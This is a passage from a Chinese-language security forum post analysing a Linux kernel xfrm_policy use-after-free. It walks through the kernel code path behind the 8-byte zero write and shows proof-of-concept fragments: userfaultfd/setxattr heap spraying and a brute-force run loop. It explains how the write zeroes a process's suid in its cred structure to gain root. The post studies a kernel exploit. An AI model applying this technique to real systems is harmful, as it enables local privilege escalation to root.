
`int xfrm_policy_flush(struct net *net, u8 type, bool task_valid) {`
`...`
`for (dir = 0; dir < XFRM_POLICY_MAX; dir++) {`
`struct xfrm_policy *pol;`
`int i;`
`again1:`
`hlist_for_each_entry(pol, &net->xfrm.policy_inexact[dir], bydst) {`
`if (pol->type != type)`
`continue;`
`__xfrm_policy_unlink(pol, dir);`
`spin_unlock_bh(&net->xfrm.xfrm_policy_lock);`
`cnt++;`
`xfrm_audit_policy_delete(pol, 1, task_valid);`
`xfrm_policy_kill(pol); [9]`
`...`
`When the preset timer expires on the second policy, the following execution path calls the unlink operation`
`on the second policy leading to UAF write`
`in [10]:`
`static struct xfrm_policy *__xfrm_policy_unlink(struct xfrm_policy *pol, int dir)`
`{`
`struct net *net = xp_net(pol);`
`if (list_empty(&pol->walk.all))`
`return NULL;`
`/* Socket policies are not hashed. */`
`if (!hlist_unhashed(&pol->bydst)) {`
`hlist_del_rcu(&pol->bydst); [10]`
`hlist_del(&pol->byidx);`
`}`
`list_del_init(&pol->walk.all);`
`net->xfrm.policy_count[dir]--;`
`return pol;`
`}`
```
`hlist del rcu then executes hlist del on the bydst list pointer in the second policy object:`
`static inline void __hlist_del(struct hlist_node *n)`
`{`
`struct hlist_node *next = n->next;`
`struct hlist_node **pprev = n->pprev;`
`WRITE_ONCE(*pprev, next); [11]`
`if (next)`
`next->pprev = pprev;`
`}`
```
The `pprev` pointer in the second policy object still references the freed first policy. Hence, the next pointer
in the freed object gets overwritten with 0 (8-byte write) in `[11]`.

![](https://bbs.kanxue.com/upload/attach/202009/734587_ZY64BKUYAF5HJJW.png)

期间，二次插入后效果如图，现在删除pol1。

`next = pol1->next = NULL;`

`pprev = pol1->pprev = pol2;`

`*pprev = next ==> pol2->next = NULL;`

`next->pprev = pprev` 没有操作。

最终：

`pol2->pprev = pol1`。`pol2`还引用这释放后的`pol1`值。 堆喷站位。

删除pol2

`next = pol2->next =NULL`

`pprev = pol2->pprev =pol1`

`pprev = next ==> pol1->next = NULL`

`next->pprev = pprev ==>` 没有操作；

那么我们就可以在二次分配的内存中写入八字节的0； 也就是改写`struct xfrm_policy`结构体的 位于bydst的元素。

也就是说，如果我们控制了`pol1->next`的指针，就是一个地址写0的漏洞。

# 二. poc实现利用

整个poc利用uffd监控缺页异常，并通过用户态对缺页进行填充。

```
static pthread_t spray_setxattr(int flag, int idx)
{
pthread_t ret;
void *addr;
addr = mmap(NULL, 0x1000, 3, 0x22, -1, 0);
/* TODO */
if (!addr) {
perror("mmap");
exit(-1);
}

ret = uffd_setup(addr, 0x1000, flag, idx);
sem_wait(&shmaddr[idx]);
if (flag) {
int c;
read(pipedes1[0], &c, 1);
}
setxattr("/etc/passwd", "user.test", addr, 0x400, 1);
/* TODO */
return ret;
}

void *addr;
addr = (void *)(msg.arg.pagefault.address & 0xfffffffffffff000);
sem_post(&shmaddr[idx + 1]);
int c;
read(pipedes0[0], &c, 1);

struct uffdio_copy io_copy;
char src[0x1000];
io_copy.dst = (unsigned long)addr;
io_copy.src = (unsigned long)src;
io_copy.len = 0x1000;
io_copy.mode = 0;
if ((idx > (SEM_MAX - 1)) || (idx < 205)) {
sleep(1);
if ((ioctl(fd, UFFDIO_COPY, &io_copy)) != 0)
perror("UFFDIO_COPY");
}
else if ((ioctl(fd, UFFDIO_COPY, &io_copy)) != 0) {
perror("UFFDIO_COPY");
}
sleep(3);
```
本来有个setup_sandbox启用子命名空间，但是被注释掉了。

对缺页进行填充的数据居然不用填。堆喷后的uaf到底执行了什么。单从数据来看，什么也没传进去。

开始没明白，后来看了这个 574K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8Y4c8Q4x3V1j5J5z5o6p5@1

原来又是一个高端的堆喷技巧，`userfaultfd setxattr` 精确堆喷的技巧。

`while true; do ./test && break; done`

# 三. 完成提权

大致懂了，通过不断竞争，我们要实现的是在新建的进程的`cred`结构体中 任意ruid euid suid置零的操作，通过我们的置零uaf。但其实本身这并不是通常的uaf利用过程，而且能不能提权全靠运气，但是大部分情况还真能。不得不服。

```
struct cred {
atomic_t usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
atomic_t subscribers;
/* number of processes subscribed */
void *put_addr;
unsigned magic;
#define CRED_MAGIC 0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
uid_t uid;
/* real UID of the task */
gid_t gid;
/* real GID of the task */
uid_t suid;
/* saved UID of the task */
gid_t sgid;
/* saved GID of the task */
uid_t euid;
/* effective UID of the task */
gid_t egid;
/* effective GID of the task */
uid_t fsuid;
/* UID for VFS ops */
gid_t fsgid;
/* GID for VFS ops */
unsigned securebits;
/* SUID-less security management */
kernel_cap_t cap_inheritable;
/* caps our children can inherit */
kernel_cap_t cap_permitted;
/* caps we're permitted */
kernel_cap_t cap_effective;
/* caps we can actually use */
kernel_cap_t cap_bset;
/* capability bounding set */
......
};
```

```
struct xfrm_policy {
#ifdef CONFIG_NET_NS
struct net *xp_net;
#endif
struct hlist_node bydst;
struct hlist_node byidx;
.....
};

typedef __kernel_uid32_t uid_t;
```

`cred`结构 `usage` 32位。`uid_t` 也是32位。也就是说到`suid`，刚好是12byte。而`xfrm_policy`到开始待`bydst`刚好也是12byte。神奇的是发生了，利用堆喷完成 超级多的 Small bin。而且这两结构体都在smallbin中。也就是说，提权的程序产生的新进程中的肯定会用到堆喷的small bin。当`xfrm_policy`发生uaf后，12byte的small bin刚好被重置位零，也就是`suid`变成了0。那么拥有`suid = 0`的进程就可以成功的利用`seteuid`, `setresuid`提权成功。至此全篇结束。

参考：

1.1cbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1N6h3q4K6P5h3&6@1i4K6u0W2j5$3!0E0i4K6u0r3j5X3I4G2k6#2)9J5c8Y4g2T1N6h3&6@1N6g2)9J5k6r3y4W2L8Y4c8G2M7#2)9J5k6s2u0W2k6r3S2S2N6q4)9J5k6s2m8J5K9i4k6W2M7$3x3`.

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2020-12-13 12:39

被inquisiter编辑，原因：
